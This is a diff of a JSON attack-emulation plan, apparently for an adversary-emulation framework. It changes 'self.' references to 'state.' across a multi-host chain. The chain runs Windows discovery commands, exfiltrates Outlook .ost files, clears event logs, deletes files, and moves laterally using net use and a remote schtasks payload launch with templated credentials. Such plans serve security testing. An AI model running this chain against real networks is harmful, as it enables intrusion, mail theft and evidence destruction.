@@ -13,7 +13,10 @@
             "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
-                "tool": "self.tool_name"
+                "tool": "state.tool_name"
+            },
+            "set_state": {
+                "actuator": "postconditions.actuator.ret.registered_id"
             }
         },
         {
@@ -21,9 +24,9 @@
             "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -31,9 +34,9 @@
             "technique": "DNS",
             "label": "DNS",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -41,11 +44,11 @@
             "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
-                "self.tool_name": "self.tool",
-                "payload": "self.payload_name",
-                "exfiltration": "self.exfil",
-                "driveby": "self.driveby",
-                "driveby_ctl": "self.chimera"
+                "state.tool_name": "state.tool",
+                "payload": "state.payload_name",
+                "exfiltration": "state.exfil",
+                "driveby": "state.driveby",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -53,7 +56,7 @@
             "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
-                "tool": "self.tool"
+                "tool": "state.tool"
             }
         },
         {
@@ -61,10 +64,10 @@
             "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
-                "actuator": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -72,10 +75,10 @@
             "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -83,13 +86,16 @@
             "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             },
             "tune": {
                 "infra": true
+            },
+            "set_state": {
+                "agent_tgt1": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -97,9 +103,9 @@
             "technique": "ProcessDiscovery",
             "label": "ProcessDiscovery_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c tasklist"
@@ -110,9 +116,9 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c systeminfo"
@@ -123,9 +129,9 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c fsutil volume list"
@@ -136,9 +142,9 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t1_3",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c vssadmin list shadows"
@@ -149,9 +155,9 @@
             "technique": "SystemOwnerUserDiscovery",
             "label": "systemOwnerUserDiscovery_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c quser"
@@ -162,9 +168,9 @@
             "technique": "SystemTimeDiscovery",
             "label": "SystemTimeDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c time /t"
@@ -175,9 +181,9 @@
             "technique": "SystemTimeDiscovery",
             "label": "SystemTimeDiscovery_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c net time /dom"
@@ -188,9 +194,9 @@
             "technique": "SystemNetworkConnectionsDiscovery",
             "label": "systemNetworkConnectionsDiscovery_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "netstat -ano"
@@ -201,9 +207,9 @@
             "technique": "LocalAccount",
             "label": "localAccount_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -211,9 +217,9 @@
             "technique": "DomainAccount",
             "label": "DomainAccount_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c net user /dom"
@@ -224,9 +230,9 @@
             "technique": "DomainAccount",
             "label": "DomainAccount_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c net user Administrator"
@@ -237,9 +243,9 @@
             "technique": "LocalGroups",
             "label": "LocalGroups_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c net localgroup administrators"
@@ -250,9 +256,9 @@
             "technique": "SystemServiceDiscovery",
             "label": "SystemServiceDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c net start"
@@ -263,9 +269,9 @@
             "technique": "SystemServiceDiscovery",
             "label": "SystemServiceDiscovery_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c net use"
@@ -276,9 +282,9 @@
             "technique": "BrowserBookmarkDiscovery",
             "label": "BrowserBookmarkDiscovery_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -286,9 +292,9 @@
             "technique": "DomainTrustDiscovery",
             "label": "DomainTrustDiscovery_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c nltest /domain_trusts"
@@ -299,9 +305,9 @@
             "technique": "LocalEmailCollection",
             "label": "localEmailCollection_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -309,9 +315,9 @@
             "technique": "TimeStomp",
             "label": "timeStomp_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -319,9 +325,9 @@
             "technique": "NetworkShareDiscovery",
             "label": "networkShareDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -329,9 +335,9 @@
             "technique": "NetworkShareDiscovery",
             "label": "networkShareDiscovery_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "cmd /c net view"
@@ -342,9 +348,9 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "route print"
@@ -355,9 +361,9 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "ipconfig /all"
@@ -368,9 +374,9 @@
             "technique": "DomainGroups",
             "label": "domainGroups_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "net group /DOMAIN"
@@ -381,10 +387,10 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1",
-                "exfil": "self.exfil"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1",
+                "exfil": "state.exfil"
             },
             "tune": {
                 "exfil_file": "C:\\users\\public\\outlook.ost"
@@ -395,10 +401,10 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "target": "state.target_1"
             }
         },
         {
@@ -406,9 +412,9 @@
             "technique": "ClearWindowsEventLogs",
             "label": "clearWindowsEventLogs_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -416,9 +422,9 @@
             "technique": "FileDeletion",
             "label": "clearWindowsEventLogs_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "file": "C:\\users\\public\\*.ost"
@@ -429,10 +435,10 @@
             "technique": "RemoteServices_NetUse",
             "label": "remoteServices_netuse_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target_1": "self.target_1",
-                "target_2": "self.target_2"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target_1": "state.target_1",
+                "target_2": "state.target_2"
             }
         },
         {
@@ -440,10 +446,10 @@
             "technique": "RemoteFileCopy_RoboCopy",
             "label": "remoteServices_filecopy_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target_1": "self.target_1",
-                "target_2": "self.target_2"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target_1": "state.target_1",
+                "target_2": "state.target_2"
             }
         },
         {
@@ -451,10 +457,10 @@
             "technique": "ScheduledTask",
             "label": "scheduled_task_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target_1": "self.target_1",
-                "target_2": "self.target_2"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target_1": "state.target_1",
+                "target_2": "state.target_2"
             }
         },
         {
@@ -462,11 +468,11 @@
             "technique": "ScheduledTaskExecution",
             "label": "scheduled_task_execution_t1",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target_1": "self.target_1",
-                "target_2": "self.target_2"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target_1": "state.target_1",
+                "target_2": "state.target_2"
             }
         },
         {
@@ -474,10 +480,13 @@
             "technique": "WebProtocols",
             "label": "webProtocols_2",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_2"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_2"
+            },
+            "set_state": {
+                "agent_tgt2": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -485,9 +494,9 @@
             "technique": "ProcessDiscovery",
             "label": "ProcessDiscovery_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c tasklist"
@@ -498,9 +507,9 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t2_1",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c systeminfo"
@@ -511,9 +520,9 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t2_2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c fsutil volume list"
@@ -524,9 +533,9 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t2_3",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c vssadmin list shadows"
@@ -537,9 +546,9 @@
             "technique": "SystemOwnerUserDiscovery",
             "label": "systemOwnerUserDiscovery_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c net users"
@@ -550,9 +559,9 @@
             "technique": "SystemTimeDiscovery",
             "label": "SystemTimeDiscovery_t2_1",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c time /t"
@@ -563,9 +572,9 @@
             "technique": "SystemTimeDiscovery",
             "label": "SystemTimeDiscovery_t2_2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c net time /dom"
@@ -576,9 +585,9 @@
             "technique": "SystemNetworkConnectionsDiscovery",
             "label": "systemNetworkConnectionsDiscovery_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "netstat -ano"
@@ -589,9 +598,9 @@
             "technique": "LocalAccount",
             "label": "localAccount_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             }
         },
         {
@@ -599,9 +608,9 @@
             "technique": "DomainAccount",
             "label": "DomainAccount_t2_1",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c net user /dom"
@@ -612,9 +621,9 @@
             "technique": "DomainAccount",
             "label": "DomainAccount_t2_2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c net user Administrator"
@@ -625,9 +634,9 @@
             "technique": "LocalGroups",
             "label": "LocalGroups_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c net localgroup administrators"
@@ -638,9 +647,9 @@
             "technique": "SystemServiceDiscovery",
             "label": "SystemServiceDiscovery_t2_1",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c net start"
@@ -651,9 +660,9 @@
             "technique": "SystemServiceDiscovery",
             "label": "SystemServiceDiscovery_t2_2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c net use"
@@ -664,9 +673,9 @@
             "technique": "BrowserBookmarkDiscovery",
             "label": "BrowserBookmarkDiscovery_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             }
         },
         {
@@ -674,9 +683,9 @@
             "technique": "DomainTrustDiscovery",
             "label": "DomainTrustDiscovery_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c nltest /domain_trusts"
@@ -687,9 +696,9 @@
             "technique": "LocalEmailCollection",
             "label": "localEmailCollection_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             }
         },
         {
@@ -697,9 +706,9 @@
             "technique": "TimeStomp",
             "label": "localEmailCollection_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             }
         },
         {
@@ -707,9 +716,9 @@
             "technique": "NetworkShareDiscovery",
             "label": "NetworkShareDiscovery_t2_1",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             }
         },
         {
@@ -717,9 +726,9 @@
             "technique": "NetworkShareDiscovery",
             "label": "NetworkShareDiscovery_t2_2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "cmd /c net view"
@@ -730,9 +739,9 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t2_1",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "route print"
@@ -743,9 +752,9 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t2_2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "ipconfig /all"
@@ -756,9 +765,9 @@
             "technique": "DomainGroups",
             "label": "domainGroups_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "net group /DOMAIN"
@@ -769,10 +778,10 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2",
-                "exfil": "self.exfil"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2",
+                "exfil": "state.exfil"
             },
             "tune": {
                 "exfil_file": "C:\\users\\public\\*.ost"
@@ -783,10 +792,10 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t2_1",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "target": "state.target_2"
             }
         },
         {
@@ -794,9 +803,9 @@
             "technique": "ClearWindowsEventLogs",
             "label": "clearWindowsEventLogs_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             }
         },
         {
@@ -804,9 +813,9 @@
             "technique": "FileDeletion",
             "label": "clearWindowsEventLogs_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "file": "C:\\users\\public\\*.ost"
@@ -817,13 +826,13 @@
             "technique": "RemoteServices_NetUse",
             "label": "remoteServices_netuse_t2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target_1": "self.target_2",
-                "target_2": "self.target_3"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target_1": "state.target_2",
+                "target_2": "state.target_3"
             },
             "tune": {
-                "command": "net use \\\\${self.target_3_hostname}/User:${self.target_3_username}@${self.domain}${self.target_3_password}"
+                "command": "net use \\\\${state.target_3_hostname}/User:${state.target_3_username}@${state.domain}${state.target_3_password}"
             }
         },
         {
@@ -831,10 +840,10 @@
             "technique": "RemoteFileCopy_RoboCopy",
             "label": "remoteServices_filecopy_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target_1": "self.target_2",
-                "target_2": "self.target_3"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target_1": "state.target_2",
+                "target_2": "state.target_3"
             }
         },
         {
@@ -842,14 +851,14 @@
             "technique": "ScheduledTask",
             "label": "scheduled_task",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target_1": "self.target_2",
-                "target_2": "self.target_3"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target_1": "state.target_2",
+                "target_2": "state.target_3"
             },
             "tune": {
-                "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN${self.target_3_taskname}/TR${self.target_3_file_location}\\${self.payload_name}/RL Highest /U${self.target_3_username}@${self.domain}/P${self.target_3_password}/RU${self.target_3_username}@${self.domain}/RP${self.target_3_password}/S${self.target_3_hostname}"
+                "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN${state.target_3_taskname}/TR${state.target_3_file_location}\\${state.payload_name}/RL Highest /U${state.target_3_username}@${state.domain}/P${state.target_3_password}/RU${state.target_3_username}@${state.domain}/RP${state.target_3_password}/S${state.target_3_hostname}"
             }
         },
         {
@@ -857,14 +866,14 @@
             "technique": "ScheduledTaskExecution",
             "label": "scheduled_task_execution",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target_1": "self.target_2",
-                "target_2": "self.target_3"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target_1": "state.target_2",
+                "target_2": "state.target_3"
             },
             "tune": {
-                "command": "cmd.exe /c schtasks.exe /run /tn${self.target_3_taskname}/U${self.target_3_username}@${self.domain}/P${self.target_3_password}/S${self.target_3_hostname}"
+                "command": "cmd.exe /c schtasks.exe /run /tn${state.target_3_taskname}/U${state.target_3_username}@${state.domain}/P${state.target_3_password}/S${state.target_3_hostname}"
             }
         },
         {
@@ -872,10 +881,13 @@
             "technique": "WebProtocols",
             "label": "webProtocols_3",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_3"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_3"
+            },
+            "set_state": {
+                "agent_tgt3": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -883,9 +895,9 @@
             "technique": "ProcessDiscovery",
             "label": "ProcessDiscovery_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c tasklist"
@@ -896,9 +908,9 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t3_1",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c systeminfo"
@@ -909,9 +921,9 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t3_2",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c fsutil volume list"
@@ -922,9 +934,9 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t3_3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c vssadmin list shadows"
@@ -935,9 +947,9 @@
             "technique": "SystemOwnerUserDiscovery",
             "label": "systemOwnerUserDiscovery_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c quser"
@@ -948,9 +960,9 @@
             "technique": "SystemTimeDiscovery",
             "label": "SystemTimeDiscovery_t3_1",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c time /t"
@@ -961,9 +973,9 @@
             "technique": "SystemTimeDiscovery",
             "label": "SystemTimeDiscovery_t3_2",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c net time /dom"
@@ -974,9 +986,9 @@
             "technique": "SystemNetworkConnectionsDiscovery",
             "label": "systemNetworkConnectionsDiscovery_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
